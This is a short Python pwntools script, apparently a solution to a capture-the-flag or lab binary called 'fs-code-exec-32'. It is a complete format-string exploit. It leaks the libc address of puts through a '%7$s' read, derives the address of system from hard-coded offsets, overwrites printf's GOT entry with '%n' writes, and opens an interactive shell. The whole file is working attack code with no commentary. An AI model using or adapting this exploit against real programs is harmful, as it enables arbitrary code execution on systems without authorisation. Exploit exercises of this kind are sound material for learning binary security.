#!/usr/bin/env python

from pwn import *
env = {
        'PATH' : '.:/bin:/usr/bin'
        }
p = process('fs-code-exec-32', env=env)

puts_got = p.elf.got['puts']
printf_got = p.elf.got['printf']
print(hex(puts_got))
print(p.recv())

p.sendline(p32(puts_got) + "%7$s")

data = p.recv()

print(repr(data))

libc_puts = data.split(' ')[1][4:8]

print(hex(u32(libc_puts)))

#0xf7e62ca0 <_IO_puts>
#0xf7e3dda0 <__libc_system>

libc_puts = u32(libc_puts)

libc_system = libc_puts - 0xf7e62ca0 + 0xf7e3dda0

print(hex(libc_system))

first = (libc_system & 0xffff) - 8
second = (libc_system >> 16) - (libc_system & 0xffff)
if second < 0:
    second += 0x10000

buf = p32(printf_got) + p32(printf_got+2) + '%' + ("%05dx" % first) + '%7$n' + '%' + ("%05dx" % second) + '%8$n'

p.sendline(buf)
p.interactive()

